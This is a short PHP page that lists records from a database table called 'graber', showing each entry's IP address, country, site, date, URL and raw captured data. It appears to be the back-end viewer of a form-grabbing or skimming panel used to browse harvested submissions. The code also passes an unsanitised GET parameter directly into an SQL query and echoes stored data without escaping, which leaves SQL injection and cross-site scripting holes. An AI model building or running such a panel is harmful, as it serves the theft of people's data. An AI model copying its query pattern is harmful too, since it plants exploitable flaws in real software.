<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="stylesheet" href="css/screen.css" type="text/css" media="screen">
  <link rel="stylesheet" href="css/buttons.css" type="text/css" media="screen">
</head><?php
include("config.php");
include ("auth.php");
$site=$_GET['site'];
if (! $connect) die(mysql_error());
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result = mysql_query( "SELECT * FROM `graber` WHERE `id` LIKE '$site'" )
          or die("SELECT Error: ".mysql_error());
$num_rows = mysql_num_rows($result);
print "<center>There are $num_rows <b>Report's</b> found.<br>";

 

while($row = mysql_fetch_array($result))
{
	

	echo "<b>_______________________________________________ <br />";
	echo "IP:[  " . $row['ip'] . "  ]<br />";
	echo "COUNTRY:[  " . $row['contry'] . "  ]<br />";
    echo "SITE:[  " . $row['site'] . "  ]<br />";
	echo "DATE:[  " . $row['time'] . "  ]<br />";
	echo "URL:[  " .$row['url'].  "  ]<br /></b>";
		echo "<br />" .$row['data']. "<br />";
	echo "_______________________________________________ <br />";
		
}


mysql_close($connect);



?>
<form><button><a href="a.php">Go Back</a></form></button>
<html>
<BODY 
    BACKGROUND="images/paper.gif"
    BGCOLOR="#FFFFFF"
    TEXT="#000000"
    LINK="#0000FF"
    VLINK="#FF66FF"
    ALINK="#FF0000"
    >


</html>